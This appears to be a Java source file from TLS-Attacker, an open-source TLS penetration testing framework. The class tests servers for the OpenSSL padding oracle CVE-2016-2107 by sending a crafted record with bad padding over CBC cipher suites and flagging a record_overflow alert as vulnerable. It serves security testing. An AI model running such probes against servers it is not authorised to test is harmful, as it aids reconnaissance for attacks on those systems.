/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.Cve20162107CommandConfig;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.modifiablevariable.VariableModification;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.AlertDescription;
import de.rub.nds.tlsattacker.tls.constants.AlertLevel;
import de.rub.nds.tlsattacker.tls.constants.CipherSuite;
import de.rub.nds.tlsattacker.transport.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.tls.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.tls.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.protocol.alert.AlertMessage;
import de.rub.nds.tlsattacker.tls.protocol.handshake.FinishedMessage;
import de.rub.nds.tlsattacker.tls.record.Record;
import de.rub.nds.tlsattacker.tls.util.LogLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsConfig;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.tls.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Tests for the availability of the OpenSSL padding oracle (CVE-2016-2107).
 * 
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class Cve20162107 extends Attacker<Cve20162107CommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(Cve20162107.class);

    private final List<ProtocolMessage> lastMessages;

    public Cve20162107(Cve20162107CommandConfig config) {
        super(config);
        lastMessages = new LinkedList<>();
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
        ProtocolVersion[] versions;
        TlsConfig tlsConfig = configHandler.initialize(config);

        if (tlsConfig.getHighestProtocolVersion() == null) {
            versions = new ProtocolVersion[] { ProtocolVersion.TLS10, ProtocolVersion.TLS11, ProtocolVersion.TLS12 };
        } else {
            versions = new ProtocolVersion[] { tlsConfig.getHighestProtocolVersion() };// TODO
            // Initialisation
            // should
            // be
            // done
            // in
            // config
        }
        List<CipherSuite> ciphers = new LinkedList<>();
        if (tlsConfig.getSupportedCiphersuites().isEmpty()) {
            for (CipherSuite cs : CipherSuite.getImplemented()) {
                if (cs.isCBC()) {
                    ciphers.add(cs);
                }
            }
        } else {
            ciphers = tlsConfig.getSupportedCiphersuites();
        }

        for (ProtocolVersion pv : versions) {
            for (CipherSuite cs : ciphers) {
                tlsConfig.setHighestProtocolVersion(pv);
                tlsConfig.setSupportedCiphersuites(Collections.singletonList(cs)); // TODO
                                                                                   // what
                executeAttackRound(configHandler);
            }
        }

        if (vulnerable) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "VULNERABLE");
        } else {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "NOT VULNERABLE");
        }

        LOGGER.debug("All the attack runs executed. The following messages arrived at the ends of the connections");
        for (ProtocolMessage pm : lastMessages) {
            LOGGER.debug("----- NEXT TLS CONNECTION WITH MODIFIED APPLICATION DATA RECORD -----");
            LOGGER.debug("Last protocol message in the protocol flow");
            LOGGER.debug(pm.toString());
        }
    }

    private void executeAttackRound(ConfigHandler configHandler) {
        TlsConfig tlsConfig = configHandler.initialize(config);
        LOGGER.info("Testing {}, {}", tlsConfig.getHighestProtocolVersion(), tlsConfig.getSupportedCiphersuites()
                .get(0));

        TransportHandler transportHandler = configHandler.initializeTransportHandler(tlsConfig);
        TlsContext tlsContext = configHandler.initializeTlsContext(tlsConfig);
        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();

        FinishedMessage finishedMessage = (FinishedMessage) trace
                .getFirstConfiguredSendMessageOfType(HandshakeMessageType.FINISHED);
        Record record = createRecordWithBadPadding();
        finishedMessage.addRecord(record);

        // Remove last two server messages (CCS and Finished). Instead of them,
        // an alert will be sent.
        AlertMessage alertMessage = new AlertMessage(tlsConfig);

        ReceiveAction action = (ReceiveAction) (trace.getLastMessageAction());
        List<ProtocolMessage> messages = new LinkedList<>();
        messages.add(alertMessage);
        action.setConfiguredMessages(lastMessages);
        try {
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException ex) {
            LOGGER.info("Not possible to finalize the defined workflow: {}", ex.getLocalizedMessage());
        }

        ProtocolMessage lm = trace.getLastConfiguredReceiveMesssage();
        lastMessages.add(lm);
        tlsContexts.add(tlsContext);

        if (lm.getProtocolMessageType() == ProtocolMessageType.ALERT) {
            AlertMessage am = ((AlertMessage) lm);
            LOGGER.info("  Last protocol message: Alert ({},{}) [{},{}]", AlertLevel.getAlertLevel(am.getLevel()
                    .getValue()), AlertDescription.getAlertDescription(am.getDescription().getValue()), am.getLevel()
                    .getValue(), am.getDescription().getValue());
        } else {
            LOGGER.info("  Last protocol message: {}", lm.getProtocolMessageType());
        }

        if (lm.getProtocolMessageType() == ProtocolMessageType.ALERT
                && ((AlertMessage) lm).getDescription().getValue() == 22) {
            LOGGER.info("  Vulnerable");
            vulnerable = true;
        } else {
            LOGGER.info("  Not Vulnerable / Not supported");
        }

        transportHandler.closeConnection();
    }

    private Record createRecordWithBadPadding() {
        byte[] plain = new byte[] { (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255,
                (byte) 255 };
        Record r = new Record();
        ModifiableByteArray plainData = new ModifiableByteArray();
        VariableModification<byte[]> modifier = ByteArrayModificationFactory.explicitValue(plain);
        plainData.setModification(modifier);
        r.setPlainRecordBytes(plainData);
        return r;
    }
}
